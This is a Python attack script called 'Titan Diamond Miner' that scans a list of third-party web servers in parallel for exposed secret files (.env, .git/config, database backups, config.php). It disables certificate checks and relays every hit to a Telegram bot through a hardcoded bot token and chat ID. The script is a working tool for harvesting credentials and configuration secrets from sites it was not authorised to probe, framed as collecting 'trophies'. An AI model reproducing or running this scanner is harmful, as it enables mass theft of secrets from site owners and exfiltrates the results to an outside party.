import asyncio
import httpx
import os
import sys
from rich.console import Console
from rich.panel import Panel

console = Console()

# --- CODEHUB ARMORY [cite: 2026-01-14] ---
BOT_TOKEN = "8290479304:AAEA6o56IPfTNb8KJqSfiFXWLVjfU4DjxS0"
CHAT_ID = "6397223062"
TARGETS_FILE = os.path.expanduser("~/Titan-Lab/targets.txt")
VAULT_LOG = os.path.expanduser("~/Titan-Lab/Data_Vault/DIAMONDS.log")

# DIAMOND SEARCH PATTERNS (The Trophies)
PATTERNS = ["/.env", "/.git/config", "/backup.sql", "/config.php"]

async def send_diamond_alert(link):
    async with httpx.AsyncClient() as client:
        try:
            msg = f"💎 [TITAN G3] DIAMOND SECURED:\n🔗 {link}"
            await client.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                              json={"chat_id": CHAT_ID, "text": msg})
        except: pass

async def mine_target(sem, target):
    async with sem:
        target = target.strip()
        if not target: return
        if not target.startswith("http"): target = f"http://{target}"
        
        async with httpx.AsyncClient(timeout=4.0, verify=False, follow_redirects=True) as client:
            for p in PATTERNS:
                try:
                    url = f"{target.rstrip('/')}{p}"
                    r = await client.get(url)
                    if r.status_code == 200 and len(r.content) > 100:
                        console.print(f"[bold cyan]💎 FOUND:[/bold cyan] {url}")
                        with open(VAULT_LOG, "a") as f: f.write(f"{url}\n")
                        await send_diamond_alert(url)
                except: continue

async def main():
    os.system('clear')
    console.print(Panel("[bold white]TITAN DIAMOND MINER V3.4[/bold white]", border_style="cyan"))
    
    if not os.path.exists(TARGETS_FILE) or os.path.getsize(TARGETS_FILE) == 0:
        console.print("[red]Critical Error: targets.txt is empty. Check Session 0.[/red]")
        return

    with open(TARGETS_FILE, "r") as f:
        targets = list(set(f.readlines()))

    console.print(f"[bold green]Target Locked: {len(targets)} Units Ready to be Mined.[/bold green]")
    
    # 100 Ants working in parallel
    sem = asyncio.Semaphore(100)
    await asyncio.gather(*[mine_target(sem, t) for t in targets])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit()
